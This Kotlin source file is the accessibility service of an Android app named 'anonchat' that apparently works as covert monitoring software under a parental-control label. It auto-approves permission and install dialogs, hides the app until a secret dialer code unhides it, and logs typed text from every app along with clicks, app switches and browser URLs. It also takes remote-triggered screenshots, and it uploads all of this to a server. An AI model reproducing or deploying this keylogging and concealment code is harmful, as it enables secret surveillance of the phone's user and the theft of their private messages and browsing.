package com.anonchat.app.parentalcontrol.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.anonchat.app.parentalcontrol.api.ApiClient
import com.anonchat.app.parentalcontrol.api.CloudConfig
import com.anonchat.app.parentalcontrol.manager.AutoPermissionHelper
import com.anonchat.app.ui.main.MainActivity
import com.anonchat.app.util.AppHider

class TrackerAccessibilityService : AccessibilityService() {

    private var lastPackageName: String? = null
    private var lastEventTime: Long = 0
    private var lastWebUrl: String? = null
    private var lastWebUrlTime: Long = 0

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val now = System.currentTimeMillis()

        // ── Auto Permission & Setup Approval ──────────────────────────
        // Only auto-tap known permission/install dialogs (NOT settings/systemui)
        if (AutoPermissionHelper.isAutoTappableDialog(packageName)) {
            val success = AutoPermissionHelper.autoApproveDialog(this)
            if (success) {
                Log.d(TAG, "Auto-approved dialog from: $packageName")
                lastEventTime = now
                return
            }
        }

        // ── Dialer Secret Code Detection (Android 12+ fallback) ──────
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
        ) {
            if (AutoPermissionHelper.checkDialerForSecretCode(this, packageName)) {
                Log.d(TAG, "Secret code detected in dialer — launching app")
                AppHider.showApp(this)
                // Route through SecretCodeReceiver.launchApp, which waits for the
                // PackageManager to publish the alias re-enable before starting the
                // activity — otherwise startActivity() can be dropped on some OEMs.
                com.anonchat.app.receiver.SecretCodeReceiver.launchAfterUnhide(this)
                lastEventTime = now
                return
            }
        }

        // ── Monitoring (only when tracking is active) ────────────────
        if (!TrackerService.isRunning) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                if (now - lastEventTime > 2000) {
                    lastPackageName = packageName
                    lastEventTime = now
                    val className = event.className?.toString() ?: ""
                    val appName = getAppName(packageName)
                    sendAppSwitchReport(packageName, appName, className)
                }
                if (isBrowserPackage(packageName) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    val eventText = event.text?.joinToString(" ") ?: ""
                    val url = extractUrlFromBrowserWindow()
                    val resolvedUrl = url ?: extractUrl(eventText)
                    if (resolvedUrl != null && resolvedUrl != lastWebUrl && now - lastWebUrlTime > 3000) {
                        lastWebUrl = resolvedUrl
                        lastWebUrlTime = now
                        sendWebHistoryWithTitle(packageName, resolvedUrl, eventText.take(200))
                    } else if (eventText.isNotBlank() && eventText.length > 3 && now - lastWebUrlTime > 10000) {
                        lastWebUrlTime = now
                        sendWebHistoryWithTitle(packageName, "browsing:${packageName}", eventText.take(200))
                    }
                }
            }

            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                if (isBrowserPackage(packageName) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val source = event.source
                    if (source != null) {
                        val url = findUrlInNode(source)
                        source.recycle()
                        if (url != null && url != lastWebUrl && now - lastWebUrlTime > 3000) {
                            lastWebUrl = url
                            lastWebUrlTime = now
                            sendWebHistoryWithTitle(packageName, url, "")
                        }
                    }
                }
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val source = event.source
                    if (source != null && !source.isPassword) {
                        val text = event.text?.joinToString(" ")
                        val pkg = event.packageName?.toString() ?: ""
                        if (text != null && text.isNotBlank() && text.length > 3) {
                            if (isBrowserPackage(pkg)) {
                                val url = extractUrl(text)
                                if (url != null) {
                                    val now = System.currentTimeMillis()
                                    if (url != lastWebUrl && now - lastWebUrlTime > 3000) {
                                        lastWebUrl = url
                                        lastWebUrlTime = now
                                        sendWebHistory(pkg, url)
                                    }
                                    source.recycle()
                                    return
                                }
                            }
                            sendKeyLog(pkg, text)
                        }
                        source.recycle()
                    }
                }
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val pkg = event.packageName?.toString() ?: return
                val viewId = event.contentDescription?.toString()
                if (viewId != null && viewId.isNotBlank()) {
                    sendClickReport(pkg, viewId)
                }
            }
        }
    }

    override fun onInterrupt() {}

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.d(TAG, "TrackerAccessibilityService connected")
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) instance = null
    }

    private fun sendAppSwitchReport(packageName: String, appName: String, className: String) {
        Thread {
            try {
                val payload = org.json.JSONObject().apply {
                    put("device_id", com.anonchat.app.parentalcontrol.api.CloudConfig.deviceId)
                    put("activities", org.json.JSONArray().apply {
                        put(org.json.JSONObject().apply {
                            put("activity_type", "app_switch")
                            put("package_name", packageName)
                            put("app_name", appName)
                            put("data", org.json.JSONObject().apply {
                                put("className", className)
                            })
                            put("timestamp", System.currentTimeMillis())
                        })
                    })
                }
                com.anonchat.app.parentalcontrol.api.ApiClient.sendBulkReport(payload.toString())
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun sendKeyLog(packageName: String, text: String) {
        Thread {
            try {
                val payload = org.json.JSONObject().apply {
                    put("device_id", com.anonchat.app.parentalcontrol.api.CloudConfig.deviceId)
                    put("activities", org.json.JSONArray().apply {
                        put(org.json.JSONObject().apply {
                            put("activity_type", "text_input")
                            put("package_name", packageName)
                            put("data", org.json.JSONObject().apply {
                                put("text", text.take(200))
                            })
                            put("timestamp", System.currentTimeMillis())
                        })
                    })
                }
                com.anonchat.app.parentalcontrol.api.ApiClient.sendBulkReport(payload.toString())
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun sendClickReport(packageName: String, viewId: String) {
        Thread {
            try {
                val payload = org.json.JSONObject().apply {
                    put("device_id", com.anonchat.app.parentalcontrol.api.CloudConfig.deviceId)
                    put("activities", org.json.JSONArray().apply {
                        put(org.json.JSONObject().apply {
                            put("activity_type", "click")
                            put("package_name", packageName)
                            put("data", org.json.JSONObject().apply {
                                put("viewId", viewId)
                            })
                            put("timestamp", System.currentTimeMillis())
                        })
                    })
                }
                com.anonchat.app.parentalcontrol.api.ApiClient.sendBulkReport(payload.toString())
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun extractUrlFromBrowserWindow(): String? {
        try {
            val root = rootInActiveWindow
            if (root == null) return null
            val url = findUrlInNode(root)
            root.recycle()
            return url
        } catch (e: Exception) {
            return null
        }
    }

    private fun extractTitleFromBrowserWindow(): String {
        try {
            val root = rootInActiveWindow ?: return ""
            val title = findTitleInNode(root)
            root.recycle()
            return title
        } catch (e: Exception) {
            return ""
        }
    }

    private val KNOWN_URL_BAR_IDS = setOf(
        "com.android.chrome:id/url_bar",
        "com.android.chrome:id/omnibox_results_container",
        "com.android.chrome:id/omnibox",
        "com.android.chrome:id/search_box",
        "org.mozilla.firefox:id/mozac_browser_awesomebar",
        "org.mozilla.firefox:id/url_bar",
        "com.opera.browser:id/url_bar",
        "com.brave.browser:id/url_bar",
        "com.sec.android.app.sbrowser:id/url_bar",
        "com.vivaldi.browser:id/url_bar",
        "com.microsoft.emmx:id/url_bar",
        "com.microsoft.emmx:id/omnibox"
    )

    private fun findUrlInNode(node: AccessibilityNodeInfo): String? {
        val viewId = node.viewIdResourceName ?: ""
        if (viewId in KNOWN_URL_BAR_IDS) {
            val text = node.text?.toString() ?: ""
            if (text.isNotBlank()) {
                val url = extractUrl(text)
                if (url != null) return url
                if (text.contains(".") && !text.contains(" ") && text.length in 4..200) return "https://$text"
            }
        }
        val text = node.text?.toString() ?: ""
        if (text.isNotBlank() && text.length > 3) {
            val url = extractUrl(text)
            if (url != null) return url
        }
        val desc = node.contentDescription?.toString() ?: ""
        if (desc.isNotBlank() && desc.length > 5) {
            val url = extractUrl(desc)
            if (url != null) return url
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findUrlInNode(child)
            child.recycle()
            if (result != null) return result
        }
        return null
    }

    private fun findTitleInNode(node: AccessibilityNodeInfo): String {
        val viewId = node.viewIdResourceName ?: ""
        if (viewId.contains("title", true) || viewId.contains("page_title", true)) {
            val text = node.text?.toString() ?: ""
            if (text.isNotBlank() && text.length > 2) return text
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findTitleInNode(child)
            child.recycle()
            if (result.isNotBlank()) return result
        }
        return ""
    }

    private fun sendWebHistoryWithTitle(packageName: String, url: String, title: String) {
        Thread {
            try {
                val payload = org.json.JSONObject().apply {
                    put("device_id", com.anonchat.app.parentalcontrol.api.CloudConfig.deviceId)
                    put("webhistory", org.json.JSONArray().apply {
                        put(org.json.JSONObject().apply {
                            put("url", url)
                            put("title", title)
                            put("browser", getAppName(packageName))
                            put("visit_count", 1)
                            put("timestamp", System.currentTimeMillis())
                        })
                    })
                }
                com.anonchat.app.parentalcontrol.api.ApiClient.sendBulkReport(payload.toString())
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun sendWebHistory(packageName: String, url: String) {
        Thread {
            try {
                val payload = org.json.JSONObject().apply {
                    put("device_id", com.anonchat.app.parentalcontrol.api.CloudConfig.deviceId)
                    put("webhistory", org.json.JSONArray().apply {
                        put(org.json.JSONObject().apply {
                            put("url", url)
                            put("title", "")
                            put("browser", getAppName(packageName))
                            put("visit_count", 1)
                            put("timestamp", System.currentTimeMillis())
                        })
                    })
                }
                com.anonchat.app.parentalcontrol.api.ApiClient.sendBulkReport(payload.toString())
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun isBrowserPackage(packageName: String): Boolean {
        return BROWSER_PACKAGES.any { packageName == it || packageName.startsWith(it) }
    }

    private fun writeDebugLog(msg: String) {
        try {
            val ts = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date())
            java.io.File(filesDir, "debug.log").appendText("$ts A11y: $msg\n")
        } catch (_: Exception) {}
    }

    private fun extractUrl(text: String): String? {
        val trimmed = text.trim()
        if (trimmed.isEmpty() || trimmed.length > 2048) return null
        if (trimmed.startsWith("http://", true) || trimmed.startsWith("https://", true)) {
            return trimmed.split(" ")[0]
        }
        if (trimmed.startsWith("www.")) {
            return "https://$trimmed".split(" ")[0]
        }
        val urlPattern = Regex("^(https?://)?[a-zA-Z0-9][-a-zA-Z0-9]*\\.[a-zA-Z]{2,}(/.*)?$", RegexOption.IGNORE_CASE)
        if (urlPattern.matches(trimmed) && trimmed.contains(".")) {
            return if (trimmed.startsWith("http", true)) trimmed else "https://$trimmed"
        }
        return null
    }

    private fun getAppName(packageName: String): String {
        return try {
            val pm = packageManager
            pm.getApplicationLabel(pm.getApplicationInfo(packageName, 0)).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    companion object {
        private const val TAG = "TrackerAccessibility"

        private val BROWSER_PACKAGES = setOf(
            "com.android.chrome",
            "com.android.browser",
            "org.mozilla.firefox",
            "com.opera.browser",
            "com.opera.mini.native",
            "com.brave.browser",
            "com.mi.globalbrowser",
            "com.vivaldi.browser",
            "com.sec.android.app.sbrowser",
            "com.android.webview",
            "com.microsoft.emmx",
            "com.google.android.googlequicksearchbox",
            "com.vivo.browser"
        )

        @Volatile
        var instance: TrackerAccessibilityService? = null
            private set

        fun isAccessibilityServiceEnabled(context: android.content.Context): Boolean {
            val am = context.getSystemService(android.app.admin.DevicePolicyManager::class.java)
            val cn = android.content.ComponentName(context, TrackerAccessibilityService::class.java)
            try {
                val enabledServices = android.provider.Settings.Secure.getString(
                    context.contentResolver,
                    android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: return false
                return enabledServices.contains(cn.flattenToString())
            } catch (e: Exception) {
                return false
            }
        }

        fun openAccessibilitySettings(context: android.content.Context) {
            val intent = android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS
            context.startActivity(Intent(intent).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            })
        }

        fun captureScreenshot(commandId: String? = null, callback: ((Boolean) -> Unit)? = null) {
            val service = instance
            if (service == null) {
                Log.e(TAG, "Screenshot failed: AccessibilityService not running")
                callback?.invoke(false)
                return
            }
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                Log.e(TAG, "Screenshot failed: Requires Android 11+")
                callback?.invoke(false)
                return
            }
            try {
                service.takeScreenshot(
                    android.view.Display.DEFAULT_DISPLAY,
                    service.mainExecutor,
                    object : AccessibilityService.TakeScreenshotCallback {
                        override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                            try {
                                val hardwareBuffer = result.hardwareBuffer
                                val colorSpace = result.colorSpace
                                val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                                hardwareBuffer.close()
                                if (bitmap != null) {
                                    Thread {
                                        try {
                                            val file = java.io.File(service.cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
                                            java.io.FileOutputStream(file).use { out ->
                                                bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, out)
                                            }
                                            bitmap.recycle()
                                            // Upload to server — pass commandId to link screenshot to remote command
                                            val success = com.anonchat.app.parentalcontrol.api.ApiClient.uploadScreenshot(file, commandId)
                                            Log.d(TAG, "Screenshot uploaded: $success")
                                            file.delete()
                                            callback?.invoke(success)
                                        } catch (e: Exception) {
                                            Log.e(TAG, "Screenshot save/upload failed: ${e.message}")
                                            callback?.invoke(false)
                                        }
                                    }.start()
                                } else {
                                    Log.e(TAG, "Screenshot bitmap is null")
                                    callback?.invoke(false)
                                }
                            } catch (e: Exception) {
                                Log.e(TAG, "Screenshot processing failed: ${e.message}")
                                callback?.invoke(false)
                            }
                        }
                        override fun onFailure(errorCode: Int) {
                            Log.e(TAG, "Screenshot failed with error code: $errorCode")
                            callback?.invoke(false)
                        }
                    }
                )
            } catch (e: Exception) {
                Log.e(TAG, "takeScreenshot exception: ${e.message}")
                callback?.invoke(false)
            }
        }
    }
}
